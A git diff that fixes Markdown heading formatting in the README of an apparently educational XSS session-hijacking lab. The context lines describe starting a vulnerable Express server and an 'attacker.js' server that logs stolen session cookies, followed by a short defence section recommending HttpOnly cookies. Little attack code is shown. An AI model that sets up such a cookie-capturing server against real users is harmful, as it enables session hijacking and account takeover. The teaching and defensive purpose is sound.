@@ -68,7 +68,7 @@ Edit
 ```sh
 npm install express
 ```
-###2️⃣ **Start the Vulnerable Web Server**
+### 2️⃣ **Start the Vulnerable Web Server**
 ```sh
 node server.js
 ```
@@ -76,7 +76,7 @@ The web app will start on:
 http://localhost:3000
 
 
-###3️⃣ **Start the Attacker’s Server**
+### 3️⃣ **Start the Attacker’s Server**
 ```sh
 
 node attacker.js
@@ -108,7 +108,7 @@ document.getElementById("loginForm").addEventListener("submit", function() {
 ### 📌 Attacker’s Server (attacker.js)
 This script captures and logs the stolen session cookies.
 
-####🔹 Inside attacker.js
+#### 🔹 Inside attacker.js
 ```js
 const express = require('express');
 const fs = require('fs');
@@ -132,7 +132,7 @@ app.listen(4000, '0.0.0.0', () => {
 ```
 ---
 
-#📌 How to Defend Against This Attack
+## 📌 How to Defend Against This Attack
 To prevent XSS-based session hijacking:
 
 1️⃣ Use HttpOnly cookies so JavaScript cannot access them.
@@ -143,7 +143,7 @@ To prevent XSS-based session hijacking:
 
 --------------------------------------------
 
-#📌 CREDITS
+# 📌 CREDITS
 
 💻 Developed by: Md Tanvir Rana(AG2409), Margarita Nyman(AG2668)
 
